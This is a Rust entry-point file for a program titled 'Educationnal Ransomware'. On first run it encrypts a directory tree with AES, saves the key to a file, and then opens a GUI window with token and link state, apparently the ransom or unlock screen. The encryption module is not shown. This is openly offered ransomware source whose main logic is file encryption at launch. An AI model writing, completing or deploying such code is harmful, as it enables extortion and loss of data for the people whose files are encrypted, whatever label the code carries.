mod cyp;
mod app;
use crate::cyp::cyp::*;
use crate::app::app::*;
use std::path::Path;
use druid::{AppLauncher, WindowDesc};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    if !Path::new(FILE_KEY).exists() {
        let mut ciph = Aescipher::new();
        let _ = aes_dirs(Path::new(&ROOT), aes_enc, &mut ciph)?;
        save_cipher_to_file(&ciph, FILE_KEY)?;
    }
    let main_window = WindowDesc::new(ui_builder)
        .window_size((800.0, 400.0))
        .title("Educationnal Ransomware");

    let initial_state = AppState {
        input_text: String::new(),
                link_clicked: false,
                token: false,
    };

    AppLauncher::with_window(main_window)
        .launch(initial_state)
        .expect("Failed to launch application");

    Ok(())
}
